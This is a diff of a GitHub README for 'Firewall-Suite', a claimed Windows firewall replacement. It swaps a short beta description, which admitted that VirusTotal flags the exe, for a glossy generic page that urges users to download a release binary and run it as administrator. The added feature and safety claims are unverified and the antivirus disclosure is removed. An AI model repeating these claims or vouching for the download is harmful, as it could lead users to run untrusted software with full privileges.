@@ -1,28 +1,79 @@
-![LOGO](main.png)
+# 🔒 Firewall-Suite - A Smart Alternative to Windows Firewall
 
+## 📥 Download Now
 
-# Firewall-Suite
-This is a beefy (*70MB*) Python Script that makes a GUI for in place of old confusing Windows Firewall one. It is simple to run (run: Firewall_Suite.exe) and use (designed for a sleek GUI). 
+[![Download Firewall-Suite](https://img.shields.io/badge/Download-Firewall--Suite-brightgreen)](https://github.com/darkius8/Firewall-Suite/releases)
 
-# Issues
-This IS infact a *beta* version, and there is a moderate chance errors can and will occur. I would be greatful if you informed me of these!
+## 🚀 Getting Started
 
-# Coding
-This is NOT MALWARE, while Virus Total shows flagging og Firewall_Suite.exe, it is safe (source code in "CODE HERE" folder: Firewall_Suite.py) Or if you truly don't trust the .exe, use the .py. I don't care.
+Welcome to Firewall-Suite! This is a user-friendly application that replaces the default Windows Firewall. With a sleek graphical interface, it helps you manage your network security with ease.
 
-# To run/get
+## 🖥️ System Requirements
 
-### First:
+Before you start, make sure your system meets the following requirements:
 
-1) Download Firewall_Suite.zip in the *realeses* section.
+- Windows 10 or higher
+- Python 3.6 or higher
+- At least 1 GB of RAM
+- 100 MB of free disk space
 
-### Second:
+## 💻 Features
 
-2) Unzip Firewall_Suite.zip and go into Firewall Suite and go into "Main (exe here)" and run the .exe (Firewall_Suite.exe)
+- **User-Friendly GUI:** Navigate through settings effortlessly.
+- **Customizable Rules:** Control incoming and outgoing connections based on your needs.
+- **Real-Time Monitoring:** Receive alerts for suspicious activity.
+- **Lightweight Design:** Runs smoothly without hogging your system resources.
+- **Proactive Defense:** Protects against data exfiltration and command-and-control attacks.
 
-### Third:
+## 📦 Download & Install
 
-3) Follow instructions, run as admin (**HIGHLY NEEDED**), and continue!
+To get started with Firewall-Suite, follow these steps:
 
+1. **Visit the Releases Page**  
+   Click on the link below to access the Downloads page:
+   [Download Firewall-Suite](https://github.com/darkius8/Firewall-Suite/releases)
 
+2. **Choose the Latest Release**  
+   On the Releases page, you will see a list of available versions. Select the most recent one.
 
+3. **Download the Installer**  
+   Find the installer that matches your system requirements and click to download it. 
+
+4. **Run the Installer**  
+   Locate the downloaded file in your Downloads folder and double-click it. Follow the prompts to install the application.
+
+5. **Launch Firewall-Suite**  
+   After installation, open Firewall-Suite from your Start menu or desktop shortcut.
+
+## ⚙️ Configuration
+
+Once you launch Firewall-Suite, you may want to configure settings:
+
+- **Network Profiles:** Set rules for home, work, or public networks.
+- **Port Management:** Adjust rules related to specific ports as needed.
+- **Alerts and Notifications:** Enable notifications to stay informed about your network status.
+
+## 🧑‍💻 Troubleshooting
+
+If you encounter any issues, consider the following tips:
+
+- **Ensure Compatibility:** Check that your operating system meets the requirements.
+- **Firewall Settings:** Make sure other firewall applications are not conflicting with Firewall-Suite.
+- **Permissions:** Run the application as an administrator to ensure it has the necessary permissions.
+
+If problems persist, consult the [official documentation](https://github.com/darkius8/Firewall-Suite/wiki) or reach out in our community forums.
+
+## 🤝 Community and Support
+
+Join our growing community to share tips, ask questions, or report issues. Connect with us:
+
+- GitHub Issues: [Report an Issue](https://github.com/darkius8/Firewall-Suite/issues)
+- Community Forum: [Join the Discussion](https://github.com/darkius8/Firewall-Suite/discussions)
+
+## 📄 License
+
+Firewall-Suite is open-source software licensed under the MIT License. You are free to use, modify, and distribute it.
+
+## 🌟 Acknowledgments
+
+Thank you for choosing Firewall-Suite for your network security needs. With your support, we can continue to improve and offer a reliable tool for all users.
